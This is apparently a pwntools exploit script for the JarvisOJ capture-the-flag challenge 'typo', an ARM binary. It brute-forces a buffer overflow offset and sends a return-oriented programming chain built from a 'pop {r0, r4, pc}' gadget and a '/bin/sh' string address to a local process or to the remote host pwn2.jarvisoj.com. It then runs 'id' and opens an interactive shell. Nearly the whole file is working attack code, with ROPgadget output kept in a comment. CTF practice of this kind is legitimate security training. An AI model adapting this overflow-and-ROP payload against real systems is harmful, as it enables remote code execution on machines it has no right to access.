#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
import sys
#  context.log_level = "debug"

for i in range(100, 150)[::-1]:
    try:
        if sys.argv[1] == "l":
            io = process("./typo", timeout = 2)
        elif sys.argv[1] == "d":
            io = process(["qemu-arm", "-g", "1234", "./typo"])
        else:
            io = remote("pwn2.jarvisoj.com", 9888, timeout = 2)
        
        io.sendafter("quit\n", "\n")
        io.recvline()
        
        '''
        jarvisOJ_typo [master●●] ROPgadget --binary ./typo --string /bin/sh
        Strings information
        ============================================================
        0x0006c384 : /bin/sh
        jarvisOJ_typo [master●●] ROPgadget --binary ./typo --only "pop|ret" | grep r0
        0x00020904 : pop {r0, r4, pc}
        '''
        
        payload = 'a' * i + p32(0x20904) + p32(0x6c384) * 2 + p32(0x110B4)
        success(i)
        io.sendlineafter("\n", payload)
        
        io.sendline("id")
        io.recv()
        io.interactive()
        #  io.close()
    except:
        io.close()
        
            
